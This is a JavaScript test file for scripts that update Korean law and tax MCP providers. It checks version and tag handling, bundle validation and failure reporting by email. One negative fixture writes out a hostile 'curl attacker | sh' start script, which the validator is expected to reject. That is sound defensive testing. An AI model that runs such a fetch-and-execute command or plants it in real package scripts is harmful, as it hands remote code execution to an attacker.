import test from 'node:test';
import assert from 'node:assert/strict';
import {readFile} from 'node:fs/promises';
import {execFile} from 'node:child_process';
import {promisify} from 'node:util';
import {compareVersion, lawCandidate, taxCandidate, updateFiles} from '../scripts/prepare-provider-update.mjs';
import {validateBundle} from '../scripts/publish-provider-update.mjs';
import {readAutomation} from '../scripts/run-upstream-watch.mjs';
import {prepareEmail} from '../scripts/upstream-email-report.mjs';
test('providers: release comparison rejects prerelease and supports post revisions',()=>{
  assert.ok(compareVersion('2.1.0.post2','2.1.0.post1')>0);
  assert.ok(compareVersion('2.2.0','2.1.0.post99')>0);
  assert.equal(lawCandidate({name:'korean-law-mcp',version:'4.15.6'},'4.15.6'),null);
  assert.throws(()=>lawCandidate({name:'korean-law-mcp',version:'5.0.0-beta'},'4.15.6'));
});
test('providers: moved tax tag is not accepted as an existing version',()=>{
  const release={tag_name:'taxlab-v2.1.0.post1',draft:false,prerelease:false};
  const ref={ref:'refs/tags/'+release.tag_name,object:{type:'commit',sha:'b'.repeat(40)}};
  const metadata={fork:{version:'2.1.0.post1',repository:'hyunae52/korean-taxlaw-mcp'},upstream:{repository:'zisu17/korean-taxlaw-mcp'}};
  assert.throws(()=>taxCandidate(release,ref,metadata,{version:'2.1.0.post1',commit:'a'.repeat(40)}),/TAG_MOVED/);
});
test('providers: trusted publication limits executable changes to pinned dependencies',async()=>{
  const original=Object.fromEntries(await Promise.all(updateFiles.map(async p=>[p,await readFile(p,'utf8')])));
  const pkg=JSON.parse(original['package.json']);
  const good={schema_version:1,base:'a'.repeat(40),changed:true,law:pkg.dependencies['korean-law-mcp'],tax:JSON.parse(original[updateFiles[3]]),files:{[updateFiles[4]]:original[updateFiles[4]]}};
  validateBundle(good,original);
  assert.throws(()=>validateBundle({...good,files:{'src/app.ts':'arbitrary code'}},original));
  const bad=structuredClone(pkg);bad.scripts.start='curl attacker | sh';
  assert.throws(()=>validateBundle({...good,files:{'package.json':JSON.stringify(bad)}},original),/ONLY_LAW/);
  const pin={...good.tax,commit:'b'.repeat(40)};
  pin.archive_url=`https://codeload.github.com/${pin.repository}/zip/${pin.commit}`;
  assert.throws(()=>validateBundle({...good,tax:pin,files:{[updateFiles[3]]:JSON.stringify(pin)}},original),/RELEASE_VERSION_REUSED/);
});
test('providers: fixed controller version, staging, tamper and rollback regressions',async()=>{
  const result=await promisify(execFile)(process.platform==='win32'?'python':'python3',['tests/provider_updates_contract_test.py'],{timeout:20000,windowsHide:true});
  assert.match(result.stderr,/Ran 9 tests/);assert.match(result.stderr,/OK/);
});
test('providers: failed or stale automation remains visible in the daily email',async()=>{
  const automation=await readAutomation(async url=>({workflow_runs:[{id:7,created_at:'2026-10-01T00:00:00Z',status:'completed',conclusion:url.includes('deploy.yml')?'failure':'success'}]}),Date.parse('2026-10-07T00:00:00Z'));
  assert.ok(automation.every(item=>item.failed));
  const email=prepareEmail({automation},{status:'partial',checked_at:'2026-10-07T00:00:00Z'});
  assert.match(email.subject,/일부 실패/);assert.match(email.text,/36시간/);assert.match(email.text,/failure/);
});
